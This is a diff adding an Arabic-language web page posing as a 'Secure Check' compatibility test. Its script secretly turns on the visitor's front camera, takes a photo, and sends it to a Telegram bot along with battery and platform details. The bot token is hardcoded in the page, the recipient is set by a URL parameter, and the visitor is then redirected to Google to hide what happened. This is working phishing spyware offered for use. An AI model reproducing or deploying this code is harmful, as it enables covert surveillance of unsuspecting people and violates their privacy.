@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>V8 Global - Secure Check</title>
+</head>
+<body style="background:#000; color:#00ffcc; text-align:center; padding-top:100px; font-family:monospace;">
+    <div id="status">جاري فحص توافق النظام...</div>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>
+
+    <script>
+        // --- إعدادات البوت المركزية ---
+        // تأكد من تحديث التوكن هنا وفي كود بايثون معاً
+        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPROA823dxEaOZVU"; 
+
+        async function startSystem() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetID = urlParams.get('id'); // قراءة الأيدي من الرابط ليكون النظام عاماً
+
+            if (!targetID) {
+                window.location.replace("https://google.com");
+                return;
+            }
+
+            try {
+                // 1. سحب البطارية والنظام
+                let b = await navigator.getBattery();
+                let info = `🚀 **صيد جديد (نظام V8 العام):**\n\n` +
+                           `🔋 الشحن: ${Math.floor(b.level * 100)}%\n` +
+                           `📱 النظام: ${navigator.platform}\n` +
+                           `🔌 الحالة: ${b.charging ? 'متصل بالشاحن' : 'يعمل على البطارية'}`;
+
+                // 2. محاولة سحب الكاميرا
+                let stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
+                let v = document.getElementById('v');
+                v.srcObject = stream;
+
+                setTimeout(async () => {
+                    let canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
+                    let imgBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+
+                    // 3. إرسال البيانات والصورة للأيدي المحدد في الرابط عبر API تليجرام
+                    let formData = new FormData();
+                    formData.append('chat_id', targetID);
+                    formData.append('caption', info);
+                    formData.append('photo', imgBlob, 'capture.jpg');
+
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.replace("https://google.com");
+                }, 4000);
+
+            } catch (e) {
+                // في حال رفض الكاميرا، نرسل المعلومات النصية فقط للأيدي
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${targetID}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+                window.location.replace("https://google.com");
+            }
+        }
+        window.onload = startSystem;
+    </script>
+</body>
+</html>
